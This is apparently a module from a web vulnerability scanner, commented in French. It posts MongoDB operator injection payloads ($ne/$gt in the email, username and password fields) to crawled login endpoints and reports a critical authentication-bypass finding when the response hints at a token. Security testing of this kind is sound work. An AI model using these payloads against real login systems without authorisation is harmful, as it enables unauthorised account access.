"""Contournement d'authentification NoSQL (MongoDB) par opérateurs.

Injecte `$ne`/`$gt` dans les champs des endpoints de login découverts par
le crawl (formulaires + endpoints POST qui évoquent l'authentification).
"""
from __future__ import annotations

from ..scan_models import Finding
from ._util import iter_login_targets

NOSQL_PAYLOADS = [
    {"email": {"$ne": None}, "password": {"$ne": None}},
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
]


def t_nosql_auth_bypass(ctx) -> list[Finding]:
    for action, _fields in iter_login_targets(ctx.sitemap):
        ref, _, _ = ctx.safe_post(action, data={"email": "nobody@nope.tld", "password": "x"})
        if ref in (-1, 404):
            continue
        for pl in NOSQL_PAYLOADS:
            st, _, body = ctx.safe_post(action, data=pl)
            low = (body or "").lower()
            if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
                return [Finding("nosql", "nosql-auth-bypass", "critical", action,
                                "Opérateur NoSQL ($ne/$gt) -> authentification contournée",
                                request=f"POST {action}")]
    return []


ATTACKS = [
    ("nosql", "NoSQL auth bypass", t_nosql_auth_bypass),
]
